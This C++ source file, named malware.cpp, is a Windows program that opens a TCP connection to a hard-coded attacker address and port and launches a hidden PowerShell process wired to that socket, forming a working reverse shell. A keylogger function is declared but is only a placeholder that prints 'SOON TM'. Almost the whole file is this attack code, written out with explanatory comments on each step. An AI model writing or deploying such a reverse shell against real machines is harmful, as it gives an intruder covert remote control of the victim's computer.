// malware.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#include <iostream>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <Windows.h>
#pragma comment (lib, "Ws2_32.lib")

int reverseShell();
void keyLogger();
int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
    /*
    Create a reverse shell to the attacker ip
    Keylogger
    */

    int result = reverseShell();
    if (result != 0) {
        //printf("Failed");
        return 1;
    }
    keyLogger();

    return 0;
}

int reverseShell() {
    const char* serverAddress = "192.168.1.105";
    const char* serverPort = "7676";
    /*
    Initiates use of winsock dll by using WSAStartup
    Create a socket for the client:
        + Declare an addrinfo object
        + Call getaddrinfo to get server info
        + Create SOCKET object 
        + Call WSASocketW to create the client socket
    Connect to the server:
        + Call connect to connect to the server
    Spawn a reverse shell:
        + Create a cmd.exe process then writes input, output, error to the handle of the socket
    */     

    WSADATA wsaData;
    //Initiates use of winsock dll
    int iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
    if (iResult != 0)
        printf("WSAStartup fail");

    //Create a socket for the client
    addrinfo hints;
    addrinfo* results = NULL; //Pointer to linked list of addrinfo structs
    memset(&hints, 0, sizeof(hints));
    hints.ai_family = AF_INET; //Use only ipv4
    hints.ai_socktype = SOCK_STREAM; //TCP
    hints.ai_protocol = IPPROTO_TCP; 
    iResult = getaddrinfo(serverAddress, serverPort, &hints, &results);
    if (iResult != 0) {
        printf("getaddrinfo fail");
        WSACleanup();
        return 1;
    }
    SOCKET connectSocket = INVALID_SOCKET;
    addrinfo* ptr = results; // pointer to the first addrinfo struct
    connectSocket = WSASocketW(ptr->ai_family, ptr->ai_socktype, ptr->ai_protocol, 0, 0, 0);
    if (connectSocket == INVALID_SOCKET) {
        printf("Failed to create socket");
        freeaddrinfo(results);
        WSACleanup();
        return 1;
    }

    //Connect to the server
    iResult = connect(connectSocket, ptr->ai_addr, (int)ptr->ai_addrlen);
    if (iResult == SOCKET_ERROR) {
        printf("Cant connect to %s:%s", serverAddress, serverPort);
        closesocket(connectSocket);
        freeaddrinfo(results);
        WSACleanup();
        return 1;
    }

    //Spawn a reverse shell
    const wchar_t* shell = L"powershell.exe";
    wchar_t shellCmd[MAX_PATH];
    wcscpy_s(shellCmd, shell);

    STARTUPINFO startupInfo = { sizeof(startupInfo) };
    PROCESS_INFORMATION processInfo;
    HANDLE hSocket = (HANDLE)connectSocket; //Cast SOCKET value to HANDLE type
    startupInfo.dwFlags = STARTF_USESTDHANDLES; //CreateProcess will use provided handle
    startupInfo.hStdError = startupInfo.hStdInput = startupInfo.hStdOutput = hSocket; //Pipe the in, out, error to the socket
    iResult = CreateProcessW(
        0,
        shellCmd,
        0,
        0,
        TRUE, // Allow handle inheritance
        CREATE_NO_WINDOW,
        0,
        0,
        &startupInfo,
        &processInfo
    );
    if (iResult == 0) {
        send(connectSocket, "Cant create shell", 18, MSG_OOB);
        closesocket(connectSocket);
        freeaddrinfo(results);
        WSACleanup();
        return 1;
    }

    return 0;
}

void keyLogger() {
    printf("SOON TM");
}